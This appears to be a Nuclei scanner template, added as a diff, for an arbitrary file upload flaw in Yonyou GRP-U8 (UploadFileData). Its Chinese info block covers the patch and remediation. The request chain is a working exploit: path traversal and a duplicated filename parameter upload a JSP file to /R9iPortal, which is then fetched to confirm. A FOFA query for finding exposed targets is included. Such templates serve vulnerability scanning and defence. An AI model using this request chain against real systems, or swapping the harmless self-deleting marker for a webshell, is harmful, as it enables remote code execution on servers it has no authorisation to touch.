@@ -1,0 +1,70 @@
+id: 2024-105091117
+
+info:
+  name: 用友GRP-U8内控管理软件UploadFileData存在任意文件上传漏洞
+  author: k3ppf0r
+  severity: critical
+  description: |  
+    用友政务公司获知用友GRP-U8内控管理软件存在任意文件上传漏洞后，第一时间组织团队进行应急响应，分析处理漏洞问题。任意文件上传漏洞：请求URL特征： /UploadFileData?action=upload_file&filename= 恶意文件上传，未授权访问漏洞。本次漏洞原因是sql未进行预编译，现已修改解决。
+  reference:
+    - https://github.com/Co5mos/nuclei-tps/blob/main/http/vulnerabilities/yonyou/yonyou-u8-UploadFileData-fileupload.yaml
+    - https://security.yonyou.com/#/noticeInfo?id=503
+    - https://bbs.decoyit.com/thread-207-1-1.html	
+  remediation: |
+    1、已发布漏洞补丁，请及时更新修复补丁。补丁名称：【20210425-用友GRP-U8内控管理软件UploadFileData存在任意文件上传漏洞的解决方案.zip】
+    2、也可以升级2021年5月或者5月之后日期的R10补丁，也可修复此问题
+    3、按照上述1或者2方案执行后，验证应该提示接口已停用，如截图，现场可根据此验证。
+  classification:
+    cve-id: 2024-105091117
+    cvss-score: 10.0
+    cwe-id: CWE-434
+  metadata:
+    date: 2024-02-22
+    version: 用友GRP-U8产品官方在售及提供服务的版本。
+    fofa-query: app="用友-GRP-U8"
+  tags: yonyou,rce,grp,fileupload
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
+  file_content: "{{to_lower(rand_text_alpha(10))}}"
+
+http:
+  - raw:
+      - |
+        GET /login.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+      - |
+        POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename={{file_name}}&filename=1.jpg HTTP/1.1
+        Host: {{Hostname}} 
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
+
+        ------WebKitFormBoundary92pUawKc
+        Content-Disposition: form-data; name="myFile";filename="test.jpg"
+
+        <% out.println("{{file_content}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundary92pUawKc--
+      - |
+        GET /R9iPortal/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+
+    
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_2 == 200'
+          - 'status_code_3 == 200'
+          - 'contains(body_3, "{{file_content}}")'
+        condition: and
